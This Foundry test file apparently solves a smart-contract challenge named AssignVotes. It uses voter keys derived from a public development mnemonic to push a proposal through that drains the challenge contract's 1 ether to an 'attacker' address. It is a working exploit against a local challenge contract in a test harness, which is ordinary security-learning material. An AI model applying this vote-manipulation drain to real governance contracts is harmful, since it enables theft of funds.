// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

import {DeployAssignVotesScript} from "@script/5_DeployAssignVotes.s.sol";
import {AssignVotes} from "@main/AssignVotes.sol";

interface CheatCodes {

   function startPrank(address) external;
   function addr(uint256) external returns (address);
   function deriveKey(
        string calldata mnemonic,
        string calldata path,
        uint32 index
    ) external returns (uint256);

}

contract AssignVotesTest is Test, DeployAssignVotesScript {

    CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    address public attacker = address(11);

    function setUp() public {
        // vm.deal(attacker, 1 ether);
        vm.label(attacker, "Attacker");

        assignvotesChallenge = new AssignVotes{value: 1 ether}();
        // DeployAssignVotesScript.run();
    }

    function test_isSolved() public {
        vm.startPrank(attacker);

        assertEq( address(assignvotesChallenge).balance, 1 ether );
        assertEq( address(attacker).balance, 0 );

        string memory mnemonic ="test test test test test test test test test test test junk";
        uint256 voterPrivateKey;
        address voter;
        address[10] memory voters;

        for(uint32 i = 0; i < 10;) {
            voterPrivateKey = cheats.deriveKey(mnemonic, "m/44'/60'/0'/1/", i);
            voter = cheats.addr(voterPrivateKey);
            voters[i]= voter;
            unchecked {
                i++;
            }
        }
        uint256 length = voters.length;
        assignvotesChallenge.createProposal(attacker, new bytes(0), 1 ether);

        vm.stopPrank(  );

        for(uint32 j = 0; j < length;) {
            voterPrivateKey = cheats.deriveKey(mnemonic, "m/44'/60'/0'/1/", j);
            voter = cheats.addr(voterPrivateKey);
            cheats.startPrank(voter);

            assignvotesChallenge.assign(voters[j]);
            assignvotesChallenge.vote(0);
            unchecked {
                j++;
            }
            vm.stopPrank(  );
        }

        vm.startPrank(attacker);
        assignvotesChallenge.execute(0);

        assertEq( address(assignvotesChallenge).balance, 0 );
        assertEq( address(attacker).balance, 1 ether );

        vm.stopPrank(  );
    }

}